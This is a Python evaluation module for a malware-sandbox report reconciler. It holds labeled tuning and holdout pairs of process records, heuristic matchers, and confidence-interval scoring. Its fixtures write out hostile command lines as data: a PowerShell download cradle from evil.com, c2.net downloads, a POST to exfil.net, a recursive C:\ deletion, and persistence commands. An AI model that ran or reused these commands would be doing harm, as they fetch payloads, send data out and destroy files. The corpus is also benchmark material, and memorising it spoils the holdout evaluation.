"""
Labeled Process Corpus and Empirical Calibration Evaluator (Milestone 4 -> Milestone 5 Audit).
Contains:
1. Development / Tuning Corpus (16 pairs): Used during Milestone 2-3 to select heuristic weights and rules.
2. Separate Holdout Evaluation Corpus (16 pairs): Held out strictly from tuning to test out-of-sample generalization.
3. Provenance and Ground-Truth Rationale metadata for every pair to guarantee auditability.
4. Exact Clopper-Pearson binomial confidence interval calculator.
"""

from dataclasses import dataclass, field
import math
from typing import Any, Dict, List, Optional, Tuple
from ..models import EvidencePointer, ProcessObservation
from ..reconciler import get_arg_tokens, tokenize_cmdline


@dataclass
class LabeledProcessPair:
    pair_id: str
    description: str
    process_a: ProcessObservation
    process_b: ProcessObservation
    ground_truth_match: bool  # True if they represent the same logical execution step
    ground_truth_rationale: str = ""
    provenance_family: str = "SYNTHETIC_FORENSIC_CASE"
    tuning_influence: str = "NONE_HELD_OUT"  # 'TUNING_SET' or 'NONE_HELD_OUT'


def clopper_pearson_ci(k: int, n: int, alpha: float = 0.05) -> Tuple[float, float]:
    """
    Computes exact two-sided Clopper-Pearson binomial confidence interval.
    Returns (lower_bound_pct, upper_bound_pct).
    """
    if n == 0:
        return (0.0, 0.0)

    def binom_cdf(successes: int, trials: int, p_val: float) -> float:
        return sum(math.comb(trials, i) * (p_val**i) * ((1.0 - p_val)**(trials - i)) for i in range(successes + 1))

    # Lower bound
    if k == 0:
        low = 0.0
    else:
        l, r = 0.0, 1.0
        for _ in range(80):
            mid = (l + r) / 2.0
            if binom_cdf(k - 1, n, mid) > 1.0 - alpha / 2.0:
                l = mid
            else:
                r = mid
        low = (l + r) / 2.0

    # Upper bound
    if k == n:
        high = 1.0
    else:
        l, r = 0.0, 1.0
        for _ in range(80):
            mid = (l + r) / 2.0
            if binom_cdf(k, n, mid) < alpha / 2.0:
                r = mid
            else:
                l = mid
        high = (l + r) / 2.0

    return (round(low * 100.0, 1), round(high * 100.0, 1))


def create_mock_proc(
    report_id: str,
    pid: int,
    image_name: str,
    cmdline: str,
    lineage: List[str],
    depth: int,
    ppid: Optional[int] = None
) -> ProcessObservation:
    return ProcessObservation(
        report_id=report_id,
        source_pid=pid,
        source_ppid=ppid,
        image_name=image_name,
        command_line=cmdline,
        lineage_path=lineage,
        tree_depth=depth,
        evidence=EvidencePointer(
            report_id=report_id,
            json_pointer=f"/mock/{report_id}/{pid}",
            event_summary=f"PID {pid} ({image_name})",
            raw_snippet={"pid": pid, "cmdline": cmdline}
        )
    )


def get_development_tuning_corpus() -> List[LabeledProcessPair]:
    """
    Development Set (16 pairs): Used for tuning rules, penalties, and threshold weights.
    """
    return [
        # TP Cases
        LabeledProcessPair(
            "TP_01_IDENTICAL", "Identical binary and commandline at root",
            create_mock_proc("A", 1001, "sample.exe", '"C:\\temp\\sample.exe"', ["sample.exe"], 1),
            create_mock_proc("B", 8001, "sample.exe", '"C:\\sandbox\\sample.exe"', ["sample.exe"], 1),
            ground_truth_match=True,
            ground_truth_rationale="Identical initial payload binary name and invocation under root sandbox supervisor.",
            provenance_family="Initial execution bootstrap",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_02_RENAMED_PAYLOAD", "Renamed binary executing identical arguments",
            create_mock_proc("A", 1002, "update_payload.exe", '"update_payload.exe" -run -silent', ["sample.exe", "update_payload.exe"], 2),
            create_mock_proc("B", 8002, "staged_runner.bin", '"staged_runner.bin" -run -silent', ["sample.exe", "staged_runner.bin"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Both processes execute identical CLI flags (-run -silent) under the primary sample; names diverge due to sandbox guest staging.",
            provenance_family="Staged payload execution",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_03_DEPTH_SHIFT_WRAPPER", "Powershell execution with skipped cmd.exe wrapper",
            create_mock_proc("A", 1003, "powershell.exe", 'powershell.exe -enc JABzAD0... -ExecutionPolicy Bypass', ["sample.exe", "cmd.exe", "powershell.exe"], 3),
            create_mock_proc("B", 8003, "powershell.exe", 'powershell.exe -enc JABzAD0... -ExecutionPolicy Bypass', ["sample.exe", "powershell.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Equivalent PowerShell encoded command; Report A captured intermediate cmd.exe shell wrapper while Report B hooked CreateProcess directly.",
            provenance_family="Living-off-the-Land (PowerShell)",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_04_PATH_EXPANSION", "Relative temp path vs expanded absolute path",
            create_mock_proc("A", 1004, "curl.exe", 'curl.exe -o %TEMP%\\payload.bin http://c2.net/p', ["sample.exe", "curl.exe"], 2),
            create_mock_proc("B", 8004, "curl.exe", 'curl.exe -o C:\\Users\\Analyst\\AppData\\Local\\Temp\\payload.bin http://c2.net/p', ["sample.exe", "curl.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical egress URL and target payload download; one report expands %TEMP% while other preserves unexpanded variable.",
            provenance_family="Staging ingress (curl)",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_05_POWERSHELL_TOKEN_ORDER", "Powershell arguments with reordered flags",
            create_mock_proc("A", 1005, "powershell.exe", 'powershell.exe -NoProfile -WindowStyle Hidden -Command IEX ...', ["sample.exe", "powershell.exe"], 2),
            create_mock_proc("B", 8005, "powershell.exe", 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX ...', ["sample.exe", "powershell.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Equivalent evasion cradle execution; flag tokens are permuted but semantic command target is identical.",
            provenance_family="Living-off-the-Land (PowerShell flags)",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_06_RENAME_WITH_PARENT_ROLE", "Secondary payload spawned under PowerShell cradle",
            create_mock_proc("A", 1006, "agent.exe", 'C:\\temp\\agent.exe', ["sample.exe", "cmd.exe", "powershell.exe", "agent.exe"], 4),
            create_mock_proc("B", 8006, "beacon.bin", 'C:\\sandbox\\beacon.bin', ["sample.exe", "cmd.exe", "powershell.exe", "beacon.bin"], 4),
            ground_truth_match=True,
            ground_truth_rationale="Both binaries act as the dropped secondary payload executing at depth 4 under the PowerShell cradle.",
            provenance_family="Multi-stage dropper",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_07_CERTUTIL_DOWNLOAD", "Certutil decode command across environments",
            create_mock_proc("A", 1007, "certutil.exe", 'certutil -decode enc.txt out.exe', ["sample.exe", "certutil.exe"], 2),
            create_mock_proc("B", 8007, "certutil.exe", 'certutil.exe -decode enc.txt out.exe', ["sample.exe", "certutil.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Exact LOLBin certutil payload decoding across both runs.",
            provenance_family="Living-off-the-Land (certutil)",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TP_08_REGSVR32_PERSISTENCE", "Regsvr32 executing DLL with different path prefix",
            create_mock_proc("A", 1008, "regsvr32.exe", 'regsvr32.exe /s /u C:\\temp\\hook.dll', ["sample.exe", "regsvr32.exe"], 2),
            create_mock_proc("B", 8008, "regsvr32.exe", 'regsvr32.exe /s /u C:\\sandbox\\target\\hook.dll', ["sample.exe", "regsvr32.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical Squiblydoo-style DLL registration with guest filesystem path divergence.",
            provenance_family="Living-off-the-Land (regsvr32)",
            tuning_influence="TUNING_SET"
        ),

        # TN Cases
        LabeledProcessPair(
            "TN_01_POWERSHELL_DIFFERENT_PAYLOADS", "Same binary but completely different commands",
            create_mock_proc("A", 2001, "powershell.exe", 'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIA...', ["sample.exe", "powershell.exe"], 2),
            create_mock_proc("B", 9001, "powershell.exe", 'powershell.exe -Command Get-ComputerInfo; Get-Date', ["sample.exe", "powershell.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Disjoint tasks: Report A executes encoded downloader cradle; Report B executes read-only system survey.",
            provenance_family="Living-off-the-Land (divergent action)",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_02_SVCHOST_DIFFERENT_SERVICES", "Svchost hosting completely different service groups",
            create_mock_proc("A", 2002, "svchost.exe", 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p', ["services.exe", "svchost.exe"], 2),
            create_mock_proc("B", 9002, "svchost.exe", 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Netman', ["services.exe", "svchost.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Windows OS services with completely disjoint service parameters (DcomLaunch vs Netman).",
            provenance_family="OS Background Services",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_03_SAME_DEPTH_UNRELATED_BINARIES", "Identical tree depth but completely different binaries",
            create_mock_proc("A", 2003, "conhost.exe", '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff', ["cmd.exe", "conhost.exe"], 2),
            create_mock_proc("B", 9003, "werfault.exe", 'WerFault.exe -u -p 1240 -s 400', ["cmd.exe", "werfault.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Console subsystem host vs Windows Error Reporting crash handler.",
            provenance_family="Windows System Utilities",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_04_CMD_DIFFERENT_INTENT", "Cmd.exe echo test vs whoami /all discovery",
            create_mock_proc("A", 2004, "cmd.exe", 'cmd.exe /c echo test > log.txt', ["sample.exe", "cmd.exe"], 2),
            create_mock_proc("B", 9004, "cmd.exe", 'cmd.exe /c whoami /all && net user /domain', ["sample.exe", "cmd.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Trivial disk echo vs reconnaissance survey of domain credentials.",
            provenance_family="Command Shell Execution",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_05_DIFFERENT_ANCESTRY_BRANCH", "Powershell under explorer vs office doc",
            create_mock_proc("A", 2005, "powershell.exe", 'powershell.exe -ExecutionPolicy Bypass -File a.ps1', ["explorer.exe", "powershell.exe"], 2),
            create_mock_proc("B", 9005, "powershell.exe", 'powershell.exe -ExecutionPolicy Bypass -File a.ps1', ["excel.exe", "cmd.exe", "powershell.exe"], 3),
            ground_truth_match=False,
            ground_truth_rationale="Disjoint infection lineages: interactive desktop launch vs macro-mediated spearphishing cradle.",
            provenance_family="Lineage divergence",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_06_UNRELATED_SECONDARY_DROPS", "Different dropped utilities",
            create_mock_proc("A", 2006, "crash_reporter.exe", 'crash_reporter.exe -silent', ["sample.exe", "crash_reporter.exe"], 2),
            create_mock_proc("B", 9006, "updater.exe", 'updater.exe /install /service', ["sample.exe", "updater.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Entirely distinct image names, binary identities, and purpose.",
            provenance_family="Dropped components",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_07_EMPTY_VS_POPULATED_CMDLINE", "Process record with empty commandline vs arguments",
            create_mock_proc("A", 2007, "rundll32.exe", '', ["sample.exe", "rundll32.exe"], 2),
            create_mock_proc("B", 9007, "rundll32.exe", 'rundll32.exe shell32.dll,Control_RunDLL', ["sample.exe", "rundll32.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Omitted/unobserved commandline cannot be confirmed equivalent to specific Control_RunDLL export call.",
            provenance_family="Incomplete telemetry vs populated invocation",
            tuning_influence="TUNING_SET"
        ),
        LabeledProcessPair(
            "TN_08_INJECTED_VS_UNINJECTED", "Normal OS process vs targeted hollowed target",
            create_mock_proc("A", 2008, "notepad.exe", 'notepad.exe', ["sample.exe", "notepad.exe"], 2),
            create_mock_proc("B", 9008, "notepad.exe", 'notepad.exe C:\\path\\secret.txt', ["sample.exe", "cmd.exe", "notepad.exe"], 3),
            ground_truth_match=False,
            ground_truth_rationale="Different lineage depth, different parentage, and different document target argument.",
            provenance_family="Process hollowing / decoy targets",
            tuning_influence="TUNING_SET"
        ),
    ]


def get_holdout_evaluation_corpus() -> List[LabeledProcessPair]:
    """
    Holdout Evaluation Set (16 pairs):
    NEVER used to tune weights or create rules. Tests genuine out-of-sample generalization.
    Each pair is documented with its forensic ground-truth rationale, provenance family,
    and formal confirmation of tuning independence.
    """
    return [
        # Holdout True Positives (8 pairs)
        LabeledProcessPair(
            "HTP_01_MSHTA_OBFUSCATED", "Mshta executing script payload across runs",
            create_mock_proc("A", 3001, "mshta.exe", 'mshta.exe javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("calc.exe");close();', ["sample.exe", "mshta.exe"], 2),
            create_mock_proc("B", 7001, "mshta.exe", 'mshta.exe "javascript:a=new ActiveXObject(\'WScript.Shell\');a.Run(\'calc.exe\');close();"', ["sample.exe", "mshta.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical inline ActiveX WScript.Shell script invocation; divergences are purely quotes and URI percent-encoding (%20 vs space).",
            provenance_family="Living-off-the-Land (mshta inline script)",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_02_WMI_PROCESS_CREATE", "Process spawned via WMIC process call create",
            create_mock_proc("A", 3002, "wmic.exe", 'wmic.exe process call create "powershell.exe -enc JABzAD0..."', ["sample.exe", "wmic.exe"], 2),
            create_mock_proc("B", 7002, "wmic.exe", 'wmic process call create "powershell.exe -enc JABzAD0..."', ["sample.exe", "wmic.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical WMI Win32_Process creation cradle; divergence is .exe extension in invocation string.",
            provenance_family="WMI lateral execution cradle",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_03_SCHTASKS_REORDERED_FLAGS", "Schtasks execution with reordered command arguments",
            create_mock_proc("A", 3003, "schtasks.exe", 'schtasks.exe /create /tn "Updater" /tr "C:\\temp\\run.exe" /sc onlogon', ["sample.exe", "schtasks.exe"], 2),
            create_mock_proc("B", 7003, "schtasks.exe", 'schtasks.exe /create /sc onlogon /tn "Updater" /tr "C:\\temp\\run.exe"', ["sample.exe", "schtasks.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical scheduled task registration (/tn Updater /tr C:\\temp\\run.exe /sc onlogon) with permuted flag ordering.",
            provenance_family="Persistence mechanism (schtasks)",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_04_BITSADMIN_TRANSFER", "Bitsadmin download job with local path variance",
            create_mock_proc("A", 3004, "bitsadmin.exe", 'bitsadmin /transfer djob /download /priority normal http://c2.net/stage C:\\temp\\s.exe', ["sample.exe", "bitsadmin.exe"], 2),
            create_mock_proc("B", 7004, "bitsadmin.exe", 'bitsadmin.exe /transfer djob /download /priority normal http://c2.net/stage C:\\sandbox\\s.exe', ["sample.exe", "bitsadmin.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Equivalent background copy job downloading from http://c2.net/stage; local destination directory diverges per sandbox guest setup.",
            provenance_family="BITS staging transfer",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_05_POWERSHELL_CRADLE_WHITESPACE", "PowerShell cradle with slight formatting differences",
            create_mock_proc("A", 3005, "powershell.exe", 'powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/x\')"', ["sample.exe", "powershell.exe"], 2),
            create_mock_proc("B", 7005, "powershell.exe", 'powershell.exe -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/x\')"', ["sample.exe", "powershell.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Equivalent WebClient download cradle; divergence is addition of -nop flag and inner whitespace.",
            provenance_family="PowerShell WebClient cradle",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_06_DLLHOST_SURROGATE", "Dllhost surrogate hosting identical COM AppID",
            create_mock_proc("A", 3006, "dllhost.exe", 'C:\\Windows\\system32\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}', ["svchost.exe", "dllhost.exe"], 2),
            create_mock_proc("B", 7006, "dllhost.exe", 'C:\\Windows\\system32\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}', ["svchost.exe", "dllhost.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical COM surrogate activation targeting identical AppID GUID across runs.",
            provenance_family="COM surrogate execution",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_07_EXPANDED_SYSTEM_ROOT", "System root expansion vs hardcoded Windows directory",
            create_mock_proc("A", 3007, "attrib.exe", '%SystemRoot%\\System32\\attrib.exe +h +s C:\\temp\\hidden.bin', ["sample.exe", "attrib.exe"], 2),
            create_mock_proc("B", 7007, "attrib.exe", 'C:\\Windows\\System32\\attrib.exe +h +s C:\\temp\\hidden.bin', ["sample.exe", "attrib.exe"], 2),
            ground_truth_match=True,
            ground_truth_rationale="Identical file attribute modification (+h +s); Report A preserves %SystemRoot% while Report B logs expanded path.",
            provenance_family="File attribute tampering",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTP_08_SECONDARY_PAYLOAD_JAVA", "Java runtime launcher spawned under batch runner",
            create_mock_proc("A", 3008, "javaw.exe", 'javaw.exe -jar C:\\temp\\loader.jar -silent', ["sample.exe", "cmd.exe", "javaw.exe"], 3),
            create_mock_proc("B", 7008, "javaw.exe", 'javaw.exe -jar C:\\sandbox\\loader.jar -silent', ["sample.exe", "cmd.exe", "javaw.exe"], 3),
            ground_truth_match=True,
            ground_truth_rationale="Identical secondary jar execution with divergent temp path staging.",
            provenance_family="Multi-runtime execution (Java)",
            tuning_influence="NONE_HELD_OUT"
        ),

        # Holdout True Negatives (8 pairs)
        LabeledProcessPair(
            "HTN_01_MSHTA_DISJOINT_URLS", "Mshta executing two completely different URLs",
            create_mock_proc("A", 4001, "mshta.exe", 'mshta.exe http://c2-alpha.net/stage.hta', ["sample.exe", "mshta.exe"], 2),
            create_mock_proc("B", 8001, "mshta.exe", 'mshta.exe http://internal-wiki.org/help.hta', ["sample.exe", "mshta.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Disjoint destinations: malicious remote payload URL vs internal documentation URL.",
            provenance_family="Living-off-the-Land (mshta URL divergence)",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_02_BITSADMIN_BENIGN_VS_MALICIOUS", "Bitsadmin downloading legitimate driver vs malware",
            create_mock_proc("A", 4002, "bitsadmin.exe", 'bitsadmin.exe /transfer update http://vendor.com/driver.sys C:\\temp\\d.sys', ["sample.exe", "bitsadmin.exe"], 2),
            create_mock_proc("B", 8002, "bitsadmin.exe", 'bitsadmin.exe /transfer evil http://c2.net/payload.bin C:\\temp\\p.exe', ["sample.exe", "bitsadmin.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Distinct transfer jobs: vendor driver update vs malicious payload staging.",
            provenance_family="BITS transfer intent divergence",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_03_WMIC_QUERY_VS_CREATE", "Wmic passive reconnaissance vs active process creation",
            create_mock_proc("A", 4003, "wmic.exe", 'wmic.exe os get caption,version /format:list', ["sample.exe", "wmic.exe"], 2),
            create_mock_proc("B", 8003, "wmic.exe", 'wmic.exe process call create "calc.exe"', ["sample.exe", "wmic.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Read-only OS version query vs active executable invocation.",
            provenance_family="WMI method divergence",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_04_SVCHOST_NETWORKING_VS_AUDIO", "Svchost hosting Network Service vs Audio Service",
            create_mock_proc("A", 4004, "svchost.exe", 'C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p', ["services.exe", "svchost.exe"], 2),
            create_mock_proc("B", 8004, "svchost.exe", 'C:\\Windows\\system32\\svchost.exe -k AudioSrv -p -s AudioEndpointBuilder', ["services.exe", "svchost.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Completely disjoint OS service identities (NetworkRestricted vs AudioSrv).",
            provenance_family="Windows Service separation",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_05_POWERSHELL_CLEANUP_VS_EXFIL", "PowerShell cleanup script vs data exfiltration",
            create_mock_proc("A", 4005, "powershell.exe", 'powershell.exe -Command Remove-Item -Path C:\\temp\\*.log -Force', ["sample.exe", "powershell.exe"], 2),
            create_mock_proc("B", 8005, "powershell.exe", 'powershell.exe -Command Invoke-RestMethod -Uri http://exfil.net/upload -Method Post', ["sample.exe", "powershell.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Local artifact removal vs network HTTP exfiltration.",
            provenance_family="PowerShell payload intent divergence",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_06_TASKHOST_DISJOINT_MODULES", "Taskhost hosting completely disjoint tasks",
            create_mock_proc("A", 4006, "taskhostw.exe", 'taskhostw.exe {22222222-1111-1111-1111-111111111111}', ["svchost.exe", "taskhostw.exe"], 2),
            create_mock_proc("B", 8006, "taskhostw.exe", 'taskhostw.exe {99999999-8888-7777-6666-555555555555}', ["svchost.exe", "taskhostw.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Taskhost surrogates hosting completely distinct COM task GUIDs.",
            provenance_family="Taskhost surrogate separation",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_07_CMD_DIR_VS_DEL", "Cmd directory listing vs destructive deletion",
            create_mock_proc("A", 4007, "cmd.exe", 'cmd.exe /c dir C:\\Users\\Administrator\\Desktop', ["sample.exe", "cmd.exe"], 2),
            create_mock_proc("B", 8007, "cmd.exe", 'cmd.exe /c del /f /q /s C:\\*.*', ["sample.exe", "cmd.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Non-invasive read-only directory enumeration vs destructive file deletion.",
            provenance_family="Command Shell execution divergence",
            tuning_influence="NONE_HELD_OUT"
        ),
        LabeledProcessPair(
            "HTN_08_INJECTED_EXPLORER_VS_SHELL", "Desktop shell explorer vs hollowed injected child explorer",
            create_mock_proc("A", 4008, "explorer.exe", 'C:\\Windows\\explorer.exe', ["userinit.exe", "explorer.exe"], 2),
            create_mock_proc("B", 8008, "explorer.exe", 'explorer.exe', ["malware.exe", "explorer.exe"], 2),
            ground_truth_match=False,
            ground_truth_rationale="Legitimate interactive Windows desktop shell under userinit vs hollowed malware child process.",
            provenance_family="Hollowed system binaries",
            tuning_influence="NONE_HELD_OUT"
        ),
    ]


class SimpleBaselineMatcher:
    @staticmethod
    def is_match(p_a: ProcessObservation, p_b: ProcessObservation) -> Tuple[bool, float, str]:
        img_match = (p_a.image_name.lower() == p_b.image_name.lower())
        parent_a = p_a.lineage_path[-2].lower() if len(p_a.lineage_path) >= 2 else "ROOT"
        parent_b = p_b.lineage_path[-2].lower() if len(p_b.lineage_path) >= 2 else "ROOT"
        parent_match = (parent_a == parent_b)

        if img_match and parent_match:
            return True, 1.0, "Exact image and parent match"
        return False, 0.0, "Image or parent mismatch"


class MultiFactorHeuristicMatcher:
    @staticmethod
    def calculate_score(p_a: ProcessObservation, p_b: ProcessObservation) -> Tuple[float, str]:
        img_a = p_a.image_name.lower()
        img_b = p_b.image_name.lower()
        args_a = get_arg_tokens(img_a, p_a.command_line)
        args_b = get_arg_tokens(img_b, p_b.command_line)

        lolbins = {
            "powershell.exe", "cmd.exe", "svchost.exe", "rundll32.exe", "mshta.exe",
            "cscript.exe", "wscript.exe", "regsvr32.exe", "wmic.exe", "bitsadmin.exe", "schtasks.exe"
        }
        is_lolbin = (img_a in lolbins or img_b in lolbins)

        # Ancestry similarity
        anc_a = set(s.lower() for s in p_a.lineage_path[:-1])
        anc_b = set(s.lower() for s in p_b.lineage_path[:-1])
        if anc_a or anc_b:
            anc_union = anc_a | anc_b
            anc_intersect = anc_a & anc_b
            anc_sim = len(anc_intersect) / len(anc_union) if anc_union else 0.0
        else:
            anc_sim = 1.0  # Both root

        # Argument Jaccard
        if args_a and args_b:
            arg_intersect = args_a & args_b
            arg_union = args_a | args_b
            arg_jaccard = len(arg_intersect) / len(arg_union) if arg_union else 0.0
        elif not args_a and not args_b:
            arg_jaccard = 1.0
        else:
            arg_jaccard = 0.0

        # Disjoint ancestry penalty
        if (anc_a or anc_b) and anc_sim == 0.0:
            return 0.15, f"Disjoint ancestry tree: {anc_a} vs {anc_b}"

        # LOLBin divergent arguments penalty
        if is_lolbin and (args_a or args_b) and arg_jaccard < 0.20:
            return 0.25, f"LOLBin ({img_a}) with divergent arguments (arg Jaccard {arg_jaccard:.2f})"

        score = 0.0
        reasons = []

        if img_a == img_b:
            score += 0.35
            reasons.append(f"Image match ({p_a.image_name})")
        elif len(p_a.lineage_path) >= 2 and len(p_b.lineage_path) >= 2:
            if "powershell" in p_a.lineage_path[-2].lower() and "powershell" in p_b.lineage_path[-2].lower():
                score += 0.30
                reasons.append("Spawned payload role under powershell")

        score += 0.35 * arg_jaccard
        reasons.append(f"Arg Jaccard ({arg_jaccard:.2f})")

        score += 0.20 * anc_sim
        reasons.append(f"Ancestry ({anc_sim:.2f})")

        depth_delta = abs(p_a.tree_depth - p_b.tree_depth)
        if depth_delta == 0:
            score += 0.10
        elif depth_delta == 1:
            score += 0.05

        return min(round(score, 3), 1.0), "; ".join(reasons)

    @classmethod
    def is_match(cls, p_a: ProcessObservation, p_b: ProcessObservation) -> Tuple[bool, float, str]:
        score, rationale = cls.calculate_score(p_a, p_b)
        return (score >= 0.50), score, rationale


def evaluate_matcher(matcher_cls, corpus: List[LabeledProcessPair]) -> Dict[str, Any]:
    tp = 0
    fp = 0
    tn = 0
    fn = 0
    unresolved = 0

    for pair in corpus:
        predicted_match, score, rationale = matcher_cls.is_match(pair.process_a, pair.process_b)

        if 0.40 <= score < 0.50:
            unresolved += 1

        if pair.ground_truth_match:
            if predicted_match:
                tp += 1
            else:
                fn += 1
        else:
            if predicted_match:
                fp += 1
            else:
                tn += 1

    total = len(corpus)
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    false_match_rate = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    unresolved_rate = unresolved / total if total > 0 else 0.0
    f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0

    # Exact Clopper-Pearson 95% Confidence Intervals
    positives = tp + fn
    negatives = fp + tn
    predicted_positives = tp + fp

    recall_ci = clopper_pearson_ci(tp, positives) if positives > 0 else (0.0, 0.0)
    fpr_ci = clopper_pearson_ci(fp, negatives) if negatives > 0 else (0.0, 0.0)
    precision_ci = clopper_pearson_ci(tp, predicted_positives) if predicted_positives > 0 else (0.0, 0.0)

    return {
        "total_pairs": total,
        "true_positives": tp,
        "false_positives": fp,
        "true_negatives": tn,
        "false_negatives": fn,
        "unresolved_count": unresolved,
        "precision": round(precision, 3),
        "precision_95_ci": precision_ci,
        "recall": round(recall, 3),
        "recall_95_ci": recall_ci,
        "false_match_rate": round(false_match_rate, 3),
        "false_match_rate_95_ci": fpr_ci,
        "unresolved_rate": round(unresolved_rate, 3),
        "f1_score": round(f1, 3)
    }
